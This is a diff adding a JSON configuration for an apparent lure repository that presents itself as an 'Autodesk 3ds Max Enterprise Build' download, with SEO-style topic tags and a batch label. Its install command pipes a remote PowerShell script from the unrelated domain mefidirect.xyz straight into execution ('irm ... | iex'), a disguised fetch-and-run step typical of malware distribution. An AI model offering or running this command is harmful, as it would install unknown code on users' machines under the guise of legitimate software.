@@ -1,0 +1,29 @@
+{
+  "repo": "autodesk-3ds-max-enterprise-build",
+  "product": "Autodesk 3ds Max Enterprise Build",
+  "kind": "cad",
+  "install_type": "download",
+  "download_url": "https://3ds-max.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "cad",
+  "topics": [
+    "3ds-max-latest-build",
+    "3ds-max-download-page",
+    "3ds-max-howto",
+    "3ds-max-suite",
+    "pro-workflow",
+    "3ds-max-portable-ready",
+    "home-studio",
+    "cad-software",
+    "local-first",
+    "daily-driver",
+    "3d-modeling",
+    "blueprint-editor",
+    "office-ready",
+    "architecture-tools",
+    "3ds-max-connection-help"
+  ]
+}
